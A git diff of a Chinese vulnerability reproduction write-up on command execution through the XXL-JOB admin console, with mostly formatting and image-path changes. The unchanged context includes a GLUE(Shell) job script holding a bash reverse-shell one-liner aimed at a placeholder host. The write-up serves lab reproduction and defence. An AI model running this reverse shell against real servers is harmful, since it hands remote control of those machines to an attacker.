@@ -8,8 +8,8 @@ XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅
 
 参考链接：
 
-- https://github.com/xuxueli/xxl-job/issues/2979
-- https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
+* https://github.com/xuxueli/xxl-job/issues/2979
+* https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
 
 ## 漏洞影响
 
@@ -56,7 +56,7 @@ docker-compose up -d
 
 环境启动后，访问 `http://your-ip:8080/xxl-job-admin/toLogin` 即可查看到管理端登录页面，访问 `http://your-ip:9999` 可以查看到客户端（executor）。
 
-![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112143143932.png)
+![](../.gitbook/assets/image-20241112143143932.png)
 
 ## 漏洞复现
 
@@ -66,26 +66,26 @@ docker-compose up -d
 运行模式 GLUE(Shell)
 ```
 
-![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144436276.png)
+![](../.gitbook/assets/image-20241112144436276.png)
 
 点击 GLUE IDE，编辑脚本：
 
-![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144511969.png)
+![](../.gitbook/assets/image-20241112144511969.png)
 
-![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144257939.png)
+![](../.gitbook/assets/image-20241112144257939.png)
 
 点击执行一次，探测是否出网：
 
-![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144713820.png)
+![](../.gitbook/assets/image-20241112144713820.png)
 
 再次点击 GLUE IDE，编辑脚本反弹 shell：
 
-```plain
+```
 #!/bin/bash
 bash -i >& /dev/tcp/your-ip/8888 0>&1 
 ```
 
-![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112145109853.png)
+![](../.gitbook/assets/image-20241112145109853.png)
 
 ## 漏洞修复
 
